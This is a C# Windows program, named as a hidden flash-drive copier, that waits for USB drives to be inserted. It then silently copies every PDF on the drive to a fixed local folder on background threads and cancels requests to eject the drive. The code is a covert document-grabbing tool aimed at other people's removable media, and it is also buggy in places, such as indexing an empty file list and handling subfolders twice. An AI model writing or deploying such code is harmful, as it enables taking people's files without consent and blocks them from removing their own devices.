using System;
using System.Collections.Generic;
using System.Text;
using Dolinay;
using System.IO;
using System.Threading;
using System.Collections;
using System.Windows.Forms;             // required for Message

namespace Copy_Files_From_Flash_Hidden
{
    class Program:System.Windows.Forms.Form
    {
        static DriveDetector driveDetector;
        static AutoResetEvent arv = new AutoResetEvent(false);
        static void Main(string[] args)
        {
            Program p = new Program();
            p.Initialize(null);
            //ThreadPool.QueueUserWorkItem(new WaitCallback(Initialize), null);
            arv.WaitOne();
            Application.Restart();
        }
        void Initialize(object state)
        {
            driveDetector = new DriveDetector(this);
            driveDetector.DeviceArrived += new DriveDetectorEventHandler(drive_DeviceArrived);
            driveDetector.DeviceRemoved += new DriveDetectorEventHandler(drive_DeviceRemoved);
            driveDetector.QueryRemove += new DriveDetectorEventHandler(drive_QueryRemove);
            //MessageBox.Show("");
        }
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);        // call default p

            if (driveDetector != null)
            {
                driveDetector.WndProc(ref m);
            }
        }
        static void drive_QueryRemove(object sender, DriveDetectorEventArgs e)
        {
            e.Cancel = true;
        }

        static void drive_DeviceRemoved(object sender, DriveDetectorEventArgs e)
        {
            
        }

        static void drive_DeviceArrived(object sender, DriveDetectorEventArgs e)
        {
            MessageBox.Show(e.Drive);
            e.HookQueryRemove = true;
            
            ArrayList ar=new ArrayList();
            ar.Add(e.Drive);
            ar.Add("E:\\cfff\\");
            ar.Add("*.pdf");

            ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), ar);
        }
        static void RUN(object State)
        {
            ArrayList ar = State as ArrayList;
            try
            {
                copyDirectory(ar[0] as string, ar[1] as string, ar[2] as string);
            }
            catch { }
        }
        public static void copyDirectory(string Src, string Dst,string SearchPattern)
        {
            String[] Files;
            String[] dirs;

            if (Dst[Dst.Length - 1] != Path.DirectorySeparatorChar) Dst += Path.DirectorySeparatorChar;
            if (!Directory.Exists(Dst)) Directory.CreateDirectory(Dst);

            Files = Directory.GetFileSystemEntries(Src, SearchPattern);
            MessageBox.Show(Files[0]);
            foreach (string Element in Files)
            {
                //SimpleDetector.Form1.showMessage(Element);
                // Sub directories
                if (Directory.Exists(Element))
                {
                    ArrayList ar = new ArrayList();
                    ar.Add(Element);
                    ar.Add(Dst + Path.GetFileName(Element));
                    ar.Add("*.pdf");//"*.txt;*.pdf;*.doc;*.ppt"
                    //copyDirectory(Element, Dst + Path.GetFileName(Element));
                    ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), ar);
                }
                // Files in directory
                else
                {
                    try
                    {
                        File.Copy(Element, Dst + Path.GetFileName(Element), true);
                    }
                    catch { }
                }
            }
            Files = null;

            dirs = Directory.GetDirectories(Src);
            foreach (string dir in dirs)
            {
                Files = Directory.GetFileSystemEntries(dir, SearchPattern);
                foreach (string Element in Files)
                {
                    //SimpleDetector.Form1.showMessage(Element);
                    //Console.WriteLine("copy " + Element);
                    // Sub directories
                    if (Directory.Exists(Element))
                    {
                        ArrayList ar = new ArrayList();
                        ar.Add(Element);
                        ar.Add(Dst + Path.GetFileName(Element));
                        ar.Add("*.pdf");
                        //copyDirectory(Element, Dst + Path.GetFileName(Element));
                        ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), ar);
                    }
                    // Files in directory
                    else
                    {
                        try
                        {
                            File.Copy(Element, Dst + Path.GetFileName(Element), true);
                        }
                        catch { }
                    }
                }
            }
        }
    }
}
